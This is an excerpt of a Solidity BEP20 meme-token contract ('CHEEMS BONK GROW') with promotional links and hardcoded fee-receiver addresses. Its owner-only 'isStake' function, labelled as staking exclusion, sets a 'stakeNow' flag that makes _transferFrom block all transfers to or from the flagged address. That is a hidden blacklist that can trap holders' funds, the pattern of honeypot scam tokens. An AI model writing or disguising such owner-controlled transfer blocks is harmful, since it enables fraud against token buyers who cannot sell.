...
/**
Telegram: https://t.me/CheemsBonkGrow
Website: https://CheemBonkGrow.com
Reddit: https://reddit.com/u/CheemsBonkGrow
Announcements: https://t.me/CheemsBonkGrow_ann
...
contract CheemsBonkGrow is IBEP20, Auth {
    ...
    string constant _name = "CHEEMS BONK GROW";
    string constant _symbol = "CHEMGROW";
    ...
    mapping (address => bool) public stakeNow;
    ...
    address public marketingFeeReceiver = 0xddD585fa4D2BacB1345ec4FC7f179d85b927f0B9;
    address public devFeeReceiver = 0xD02661ae122D918559f4da3B8BC5E1923f1E18B8;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!stakeNow[recipient] && !stakeNow[sender], 'Address is excluded.');
   ...
   function setMaxWallet(uint256 amount) external onlyOwner {
    ...
    // Exclude staking
    function isStake(address _address, bool _value) public onlyOwner{
        stakeNow[_address] = _value;
    }
